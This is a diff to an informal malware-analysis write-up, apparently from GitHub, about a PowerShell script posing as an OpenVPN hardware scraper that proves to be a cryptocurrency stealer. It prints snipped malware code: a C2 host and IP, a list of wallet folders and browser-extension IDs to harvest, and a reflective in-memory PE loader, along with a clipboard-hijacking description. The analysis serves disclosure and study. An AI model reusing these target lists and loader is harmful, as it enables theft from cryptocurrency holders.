@@ -1,4 +1,4 @@
-# OpenVPN Client Hardware Scraper Analysis
+# "OpenVPN Client Hardware Scraper" aka Crypto Malware Analysis
 
 While performing some analysis on redacted7's auth, I discovered some strange get requests to a remote endpoint. 
 
@@ -147,3 +147,219 @@ while ($true) {
 
 This is it. Looks like we found the request that I was looking for. This is where it gets interesting. The data being sent to the servers endpoint doesnt look malicious at all. Just looks like hardware info, which is sent to the server. The recieved data is then base64 and xor decoded, and output to a hidden powershell window. This has been a very quick writeup as im doing this right before a big exam but whatever. Hope u enjoy whatever this does and feel free to look into it.
 
+2 HOURS LATER (THX QCAA <3)
+
+Ok so I am back now to look into this once again. Not to keep you hanging or anything but just before leaving for my exam, I decided to test the response coming from the website, to see what it was. And to my surprise, it wasnt an OpenVPN worker script! 
+
+```$meta_request = 'Z2V0IC9hcGkvdjEvYWRiYmRiM2Y4NWViNDQ2OTA0MTUzY2U3NDQxZTA4NTk4NTI3ZWU5NzI1NWIyNmY1M2UyYTU1NzA0NTNkZWNiOSBodHRwLzEuMQ0KaG9zdDogY2VzYXJldXJvcGUuY29tDQpjb25uZWN0aW9uOiBrZWVwLWFsaXZlDQphY2NlcHQtZW5jb2Rpbmc6IGd6aXANCngtZm9yd2FyZGVkLWZvcjogMjIwLjIzMy4yMTkuOTgNCmNmLXJheTogNzYyOGM5ZTBiYTQ5NmE0NS1zeWQNCngtZm9yd2FyZGVkLXByb3RvOiBodHRwDQpjZi12aXNpdG9yOiB7InNjaGVtZSI6Imh0dHAifQ0KdXNlci1hZ2VudDogbW96aWxsYS81LjAgKHdpbmRvd3MgbnQ7IHdpbmRvd3MgbnQgMTAuMDsgZW4tYXUpIHdpbmRvd3Nwb3dlcnNoZWxsLzUuMS4yMjYyMS42MDgNCmNmLWNvbm5lY3RpbmctaXA6IDIyMC4yMzMuMjE5Ljk4DQpjZi1pcGNvdW50cnk6IGF1DQpjZG4tbG9vcDogY2xvdWRmbGFyZQ0KDQo=';
+
+$meta_version = 620612725;
+
+$meta_guid = 9630;
+
+$meta_mutex = '98a28144-e366-4834-9d6b-3a8e02b7aae0';
+
+$meta_ip = '108.162.250.182';
+
+$meta_host = 'cesareurope.com';
+
+
+
+############################
+
+(snip)
+
+$searchPaths = @(
+    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\OneDrive\Desktop",
+    ([Environment]::GetFolderPath("Desktop")),
+    "$env:PUBLIC\Desktop",
+    "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs",
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
+    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
+);
+
+$searchEntries = @(
+    [pscustomobject]@{
+        root    = '%appdata%'
+        targets =
+        [pscustomobject]@{
+            name = 'Exodus-A'
+            path = 'Exodus'
+        },
+        [pscustomobject]@{
+            name = 'Trezor-A'
+            path = '@trezor'
+        },
+        [pscustomobject]@{
+            name = 'Atomic-A'
+            path = 'Atomic Wallet'
+        },
+        [pscustomobject]@{
+            name = 'Electrum-A'
+            path = 'Electrum'
+        },
+        [pscustomobject]@{
+            name = 'Ledger-A'
+            path = 'Ledger Live'
+        },
+        [pscustomobject]@{
+            name = 'Jaxx-A'
+            path = 'Jaxx Liberty'
+        },
+        [pscustomobject]@{
+            name = 'com.liberty.jaxx-A'
+            path = 'com.liberty.jaxx'
+        },
+        [pscustomobject]@{
+            name = 'Guarda-A'
+            path = 'Guarda'
+        },
+        [pscustomobject]@{
+            name = 'Armory-A'
+            path = 'Armory'
+        },
+        [pscustomobject]@{
+            name = 'DELTA-A'
+            path = 'DELTA'
+        },
+        [pscustomobject]@{
+            name = 'TREZOR-A'
+            path = 'TREZOR Bridge'
+        },
+        [pscustomobject]@{
+            name = 'Bitcoin-A'
+            path = 'Bitcoin'
+        },
+        [pscustomobject]@{
+            name = 'binance-A'
+            path = 'binance'
+        }
+    },
+    [pscustomobject]@{
+        root    = '%localappdata%'
+        targets =
+        [pscustomobject]@{
+            name = 'Blockstream-A'
+            path = 'Blockstream Green'
+        },
+        [pscustomobject]@{
+            name = 'Trezor-A'
+            path = '@trezorsuite-desktop-updater'
+        },
+        [pscustomobject]@{
+            name = 'Coinomi-A'
+            path = 'Coinomi'
+        }
+    },
+    [pscustomobject]@{
+         root    = '%ProgramFiles%'
+         targets =
+        [pscustomobject]@{
+            name = 'Trezor-A'
+            path = 'Trezor Suite'
+        }
+    },
+    [pscustomobject]@{
+        root    = '%localappdata%\Google\Chrome\User Data\Default\Extensions'
+        targets =
+        [pscustomobject]@{
+            name = 'Metamask-C'
+            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
+        },
+        [pscustomobject]@{
+            name = 'MEWcx-C'
+            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'
+        },
+        [pscustomobject]@{
+            name = 'Coin98-C'
+            path = 'aeachknmefphepccionboohckonoeemg'
+        },
+        [pscustomobject]@{
+            name = 'Binance-C'
+            path = 'fhbohimaelbohpjbbldcngcnapndodjp'
+        },
+        [pscustomobject]@{
+            name = 'Jaxx-C'
+            path = 'cjelfplplebdjjenllpjcblmjkfcffne'
+        },
+        [pscustomobject]@{
+            name = 'Coinbase-C'
+            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'
+        }
+    },
+    [pscustomobject]@{
+        root    = '%localappdata%\Microsoft\Edge\User Data\Default\Extensions'
+        targets =
+        [pscustomobject]@{
+            name = 'Metamask-E'
+            path = 'ejbalbakoplchlghecdalmeeeajnimhm'
+        },
+        [pscustomobject]@{
+            name = 'Coinomi-E'
+            path = 'gmcoclageakkbkbbflppkbpjcbkcfedg'
+        }
+    },
+    [pscustomobject]@{
+        root    = '%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Extensions'
+        targets =
+        [pscustomobject]@{
+            name = 'Metamask-B'
+            path = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
+        },
+        [pscustomobject]@{
+            name = 'MEWcx-B'
+            path = 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'
+        },
+        [pscustomobject]@{
+            name = 'Coin98-B'
+            path = 'aeachknmefphepccionboohckonoeemg'
+        },
+        [pscustomobject]@{
+            name = 'Binance-B'
+            path = 'fhbohimaelbohpjbbldcngcnapndodjp'
+        },
+        [pscustomobject]@{
+            name = 'Jaxx-B'
+            path = 'cjelfplplebdjjenllpjcblmjkfcffne'
+        },
+        [pscustomobject]@{
+            name = 'Coinbase-B'
+            path = 'hnfanknocfeofbddgcijnmhnfnkdnaad'
+        }
+    }
+);
+
+(snip)
+
+[Reflection.Assembly]::Load([byte[]]@(77,90,144,0,3,0,0,0,4 
+
+(snip) 
+
+));
+```
+Well doesnt that look fun. Firstly I just had a look to see what exactly the script did. By the looks of things, it just got all of the wallets and crypto related things, and posted them to a server, probably just for statistical purposes who knows with these kinds of things. But I couldnt see any secret stealing nor any form of miner dropper. So I kept digging. Next we discover this blob of asm and this looked very promising. I quickly whipped up a python script to just convert all the data to a file that I could then view in DnSpy. 
+
+```
+DATA = "77,90,144,0,3,0,0,0,4,0,0,0
+
+(snip)
+
+"
+
+f = open("payload.bin", "wb")
+
+if __name__ == "__main__":
+    for x in DATA.split(","):
+        f.write(int(x).to_bytes(1, "big"))
+```
+
+Ok now we have a binary we can analyse with DnSpy. Oh my where do I begin.
+
+![image](https://user-images.githubusercontent.com/113079075/198958508-a63a41a3-82c8-4720-bbb5-8a0b253964fc.png)
+
+We can see calls to alot of WinAPI funtions handling clipboard data and the like, so it looks like we may have some form of crypto stealer. After scrolling for a bit we see the main blob of code which does all of the fun stuff. 
+
+![image](https://user-images.githubusercontent.com/113079075/198958827-910cab97-91f1-4ac4-8c24-585b78f5ea04.png)
+
+By the looks of it, it searches for bitcoin addresses in the victims clipboard, and replaces them with the attackers address. A crude way of stealing crypto! The rest of the binary is quite boring outside of this. These crypto addresses can be looked up to see exactly how much the attacker has stolen from victims. All up, excluding (get ready) 8 million usd of solana, the attacker stole about 150 thousand usd of various cryptocurrencies. This is excluding monero as there is no way of tracking the monero blockchain (lucky for some). Now that thats out of the way, the next place of interest has to be the endpoint.
